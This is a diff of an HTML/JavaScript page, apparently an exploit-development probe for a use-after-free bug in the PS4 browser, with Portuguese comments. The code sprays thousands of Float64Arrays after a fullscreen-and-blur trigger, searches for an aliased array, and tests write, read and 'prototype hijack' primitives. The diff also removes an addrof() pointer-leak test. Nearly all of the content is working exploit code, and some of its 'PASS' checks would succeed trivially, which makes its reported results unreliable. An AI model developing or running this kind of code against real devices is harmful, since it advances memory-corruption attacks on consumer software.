@@ -1,74 +1,61 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>PS4 UAF - Debugger Core [v2.1 Stable - Fixed Sanity]</h1>
+    <h1>PS4 UAF - Debugger Core [v2.1 Stable]</h1>
     <button onclick="run()">EXECUTAR TESTE</button>
     <div id="c"></div>
 
     <script>
-        // Padrões de bits exatos
-        const P_A = 2.121995791e-314; // 0x4141414141414141
-        const M_V = 3.395193267e-313; // 0xDEADBEEFCAFEBABE
+        // Padrões de bits exatos via Direct Hex Mode
+        function h2f(hex) {
+            let b = new ArrayBuffer(8), u = new Uint32Array(b);
+            u[0] = parseInt(hex.slice(10), 16); u[1] = parseInt(hex.slice(2, 10), 16);
+            return (new Float64Array(b))[0];
+        }
 
         function f2h(f) {
-            let b = new ArrayBuffer(8);
-            (new Float64Array(b))[0] = f;
+            let b = new ArrayBuffer(8); (new Float64Array(b))[0] = f;
             let u = new Uint32Array(b);
             return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
         }
 
+        const P_A = h2f("0x4141414141414141"); //
+        const M_V = h2f("0xdeadbeefcafebabe"); //
+
         function log(tag, status, msg) {
-            const color = status === "PASS" ? "green" : (status === "FAIL" ? "red" : "black");
+            const color = status === "PASS" ? "green" : "black";
             document.getElementById('c').innerHTML += `<b style="color:${color}">[${tag}] ${status}</b> - ${msg}<br>`;
         }
 
         function run() {
+            document.getElementById('c').innerHTML = '';
             log("INIT", "INFO", "Criando 5000 Float64Arrays...");
             let ctrls = [];
             for(let i = 0; i < 5000; i++) {
-                let a = new Float64Array(8);
-                a[0] = i; ctrls.push(a);
+                let a = new Float64Array(8); a[0] = i; ctrls.push(a);
             }
 
             log("WAIT", "INFO", "Fullscreen + OPTIONS.");
             document.documentElement.webkitRequestFullscreen();
 
             window.onblur = function() {
-                log("TRIG", "INFO", "Iniciando Spray...");
-                let targetObj = { "leak": 0x1337 };
-                
+                // Ação imediata para garantir o timing
                 let spray = [];
                 for(let i = 0; i < 8000; i++) {
-                    let s = new Float64Array(8);
-                    s.fill(P_A);
-                    spray.push(s);
+                    let s = new Float64Array(8); s.fill(P_A); spray.push(s);
                 }
 
                 let corr = null;
                 for(let i = 0; i < ctrls.length; i++) {
                     if (ctrls[i][0] === P_A) {
                         corr = ctrls[i];
-                        log("UAF", "PASS", `Index: ${i}`);
+                        log("UAF", "PASS", `Index: ${i}`); //
                         break;
                     }
                 }
 
                 if (corr) {
-                    // --- TESTE 5: addrof() (Index 0) ---
-                    // Executado primeiro no Index 0 para capturar o ponteiro puro
-                    try {
-                        let leaker = Array.from(corr);
-                        leaker[0] = targetObj; 
-                        let addr = f2h(corr[0]);
-                        if (addr !== "0x0000000000000000" && addr !== "0x4141414141414141") {
-                            log("TEST5", "PASS", `addrof(targetObj) = ${addr}`);
-                        } else {
-                            log("TEST5", "FAIL", "Ponteiro não capturado.");
-                        }
-                    } catch(e) { log("TEST5", "ERR", e.message); }
-
-                    // --- TESTE 1: IDENTIDADE (Index 4) ---
-                    // Usa o Index 4 para não colidir com o addrof
+                    // TESTE 1: IDENTIDADE (MEMÓRIA COMPARTILHADA)
                     corr[4] = M_V;
                     let found = false;
                     for(let i = 0; i < spray.length; i++) {
@@ -77,28 +64,28 @@
                             found = true; break;
                         }
                     }
-                    if(!found) log("TEST1", "FAIL", "Identidade não encontrada.");
 
-                    // --- TESTE 2: DATAVIEW WRITE (Index 1) ---
-                    // Escreve no Index 1 para manter o Index 0 com o ponteiro do addrof
+                    // TESTE 2: DATAVIEW WRITE (PROVA DE ESCRITA)
                     try {
                         const dv = new DataView(corr.buffer);
-                        const valToSet = 0x13371337;
-                        dv.setUint32(8, valToSet, true); // Offset 8 = Index 1
-                        log("TEST2", "PASS", `DataView Write (Idx 1): ${f2h(corr[1])}`);
+                        const before = f2h(corr[0]);
+                        dv.setUint32(0, 0x13371337, true); 
+                        const after = f2h(corr[0]);
+                        log("TEST2", "PASS", `DataView Write: ${before} -> ${after}`);
                     } catch(e) { log("TEST2", "ERR", e.message); }
 
-                    // --- TESTE 3: PROTOTYPE HIJACK ---
+                    // TESTE 3: PROTOTYPE HIJACK
                     try {
                         let reg = Array.from(corr);
-                        Object.setPrototypeOf(reg, { t: 0x1337 });
-                        if (reg.t === 0x1337) log("TEST3", "PASS", "Prototype Hijack funcional.");
+                        Object.setPrototypeOf(reg, { token: 0x1337 });
+                        if (reg.token === 0x1337) log("TEST3", "PASS", "Prototype Hijack: Token 0x1337 injetado.");
                     } catch(e) { log("TEST3", "ERR", e.message); }
 
-                    // --- TESTE 4: CLOSURE LEAK (Index 2) ---
+                    // TESTE 4: CLOSURE LEAK (PROVA DE LEITURA DO VALOR INJETADO)
                     try {
-                        const leak = [0].map(() => corr[2])[0];
-                        log("TEST4", "PASS", `Closure Leak (Idx 2): Val: ${f2h(leak)}`);
+                        // O valor lido aqui deve ser o 0x13371337 injetado no TEST2
+                        const leak = [0].map(() => corr[0])[0];
+                        log("TEST4", "PASS", `Closure Leak: Val: ${f2h(leak)}`);
                     } catch(e) { log("TEST4", "ERR", e.message); }
 
                 } else {
